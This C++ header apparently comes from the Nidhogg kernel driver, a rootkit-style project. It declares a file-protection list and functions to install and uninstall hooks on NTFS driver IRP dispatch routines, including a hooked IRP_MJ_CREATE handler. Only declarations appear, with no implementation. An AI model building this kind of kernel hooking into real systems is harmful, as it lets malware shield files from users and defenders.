#pragma once

#include "pch.h"
#include "MemoryHelper.hpp"

extern "C" {
	#include "WindowsTypes.hpp"
	#include "NidhoggCommon.h"
}

// Definitions.
constexpr SIZE_T MAX_FILES = 256;
constexpr SIZE_T SUPPORTED_HOOKED_NTFS_CALLBACKS = 1;

struct ProtectedFile {
	WCHAR* FilePath;
	bool Protect;
};

struct FileItem {
	ULONG FileIndex;
	WCHAR FilePath[MAX_PATH];
};

struct FilesList {
	ULONG LastIndex;
	ULONG FilesCount;
	WCHAR* FilesPath[MAX_FILES];
};

struct NtfsCallback {
	PVOID Address;
	bool Activated;
};

class FileUtils {
private:
	FilesList Files;
	FastMutex Lock;
	NtfsCallback Callbacks[SUPPORTED_HOOKED_NTFS_CALLBACKS];

public:
	void* operator new(size_t size) {
		return AllocateMemory(size, false);
	}

	void operator delete(void* p) {
		ExFreePoolWithTag(p, DRIVER_TAG);
	}

	FileUtils();
	~FileUtils();

	bool FindFile(WCHAR* path);
	bool AddFile(WCHAR* path);
	bool RemoveFile(WCHAR* path);
	void ClearFilesList();
	NTSTATUS QueryFiles(FileItem* item);
	NTSTATUS InstallNtfsHook(int irpMjFunction);
	NTSTATUS UninstallNtfsHook(int irpMjFunction);

	ULONG GetFilesCount() { return this->Files.FilesCount; }
	NtfsCallback GetNtfsCallback(ULONG index) { return this->Callbacks[index]; }
};

inline FileUtils* NidhoggFileUtils;

NTSTATUS HookedNtfsIrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp);
